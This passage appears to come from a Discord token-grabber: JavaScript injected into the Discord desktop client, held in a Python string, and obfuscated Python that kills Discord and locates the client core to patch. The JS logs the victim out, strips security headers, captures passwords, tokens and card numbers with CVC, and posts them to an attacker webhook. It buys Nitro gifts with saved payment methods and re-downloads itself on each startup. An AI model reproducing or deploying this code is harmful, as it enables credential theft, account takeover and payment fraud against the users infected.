      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def NYSCXANWOFWLCMRXJQGARPRQPCZKDRJXIARGGWDVSCAQZLPYBNIF():
    import os
    import re
    import subprocess
    import psutil

    def KWKONNJMTUUYZKMRNNPMPKFCMKKNDRRYDEOAJECBURITELCGEVJVDMRTZLYDLTRKLPXHGNPOIGF(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ):
        for v4r_file in os.listdir(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ):
            if re.search(r'app-+?', v4r_file):
                KKUYWERTMNIRLLYKENXFVMHWIQDZUEWVIUUKCBRATEUEIOXXUFSCEENTH = ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ + '\\' + v4r_file + '\\modules'
                if not os.path.exists(KKUYWERTMNIRLLYKENXFVMHWIQDZUEWVIUUKCBRATEUEIOXXUFSCEENTH):
                    continue
                for v4r_file in os.listdir(KKUYWERTMNIRLLYKENXFVMHWIQDZUEWVIUUKCBRATEUEIOXXUFSCEENTH):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB = KKUYWERTMNIRLLYKENXFVMHWIQDZUEWVIUUKCBRATEUEIOXXUFSCEENTH + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB, v4r_file
        return None

    def POAFUPESDAJSPWJWOPFZPDNFFUZMVGBXGCAJLGIMHEFBYBANJBNPQUFYGNHROXLRYLFGYMYYEVSLJZYDMJNRHHEFRASEBSDFV(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ):
        UJGGFWZWDEJLXVQENYQCTUAPLUEZTERSEYOOGHNAADFIFUSKADRHN = ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ + '\\Update.exe'
        ANANCSQPKDTEVWMGCNAODOPKTPOROCYCYEVYQECQYEZWIHJFMOLINYLFVMGXK = ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ):
            if re.search(r'app-+?', v4r_file):
                BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPST = ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ + '\\' + v4r_file
                if os.path.exists(BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPST + '\\' + 'modules'):
                    for v4r_file in os.listdir(BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPST):
                        if v4r_file == ANANCSQPKDTEVWMGCNAODOPKTPOROCYCYEVYQECQYEZWIHJFMOLINYLFVMGXK:
                            ANANCSQPKDTEVWMGCNAODOPKTPOROCYCYEVYQECQYEZWIHJFMOLINYLFVMGXK = BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPST + '\\' + ANANCSQPKDTEVWMGCNAODOPKTPOROCYCYEVYQECQYEZWIHJFMOLINYLFVMGXK
                            subprocess.call([UJGGFWZWDEJLXVQENYQCTUAPLUEZTERSEYOOGHNAADFIFUSKADRHN, '--processStart', ANANCSQPKDTEVWMGCNAODOPKTPOROCYCYEVYQECQYEZWIHJFMOLINYLFVMGXK],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def IHMBHRNPNUNNUSSQXHOXZCVYMWZWQAEZWTIGPUVDTJNTLXQJZCIILZVYVJHZOLHQRANKWMXHZAUPYLZRAVDQZY():
        BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPSTdata = os.getenv('LOCALAPPDATA')
        GOEAQSBFLARDNBJZOXRXPVOEPOZQYBXVYYWYDUVEXLCBSVJRQLFJYYMX = [
            BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPSTdata + '\\Discord',
            BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPSTdata + '\\DiscordCanary',
            BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPSTdata + '\\DiscordPTB',
            BGUXYTLHGTMQWOKUQBOVGRKUFYWKHXTEIUECXDNFVQFACOFYPVHNRJBMLVJOQWKJGMPSTdata + '\\DiscordDevelopment'
        ]
        CMCLEBYMWLTHLAKKZOPUAEHQYIQIMJNDCADNVAZMLMQOQTFFUTZQTGCTDUCBKZVKMWZDYQ = UZUVWWUKKRMGRBWFGOGYKERLLHKDTJUZMDZQRYFHXQHOSXHUWRASEHWXVBUJATANYLAXAJ

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ in GOEAQSBFLARDNBJZOXRXPVOEPOZQYBXVYYWYDUVEXLCBSVJRQLFJYYMX:
            if not os.path.exists(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ):
                continue

            AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB_info = KWKONNJMTUUYZKMRNNPMPKFCMKKNDRRYDEOAJECBURITELCGEVJVDMRTZLYDLTRKLPXHGNPOIGF(ESSVJUQFLLPSKOYZTOHQDEEBJKIKWZAPVCOKGNHYUAAMMXIBAEKRXACGWNWUTTCCAKWRJQQWZPGPNGLWDTXHLUTMINAAOAFELQHZ)
            if AACOENQQFKJRPBCHAMBDVFCTUZSKNLKXJFHDLVMOLVUKZQGCWINQOFABJTHNGKAGQVQCKMKWLMOWB_info is not None:
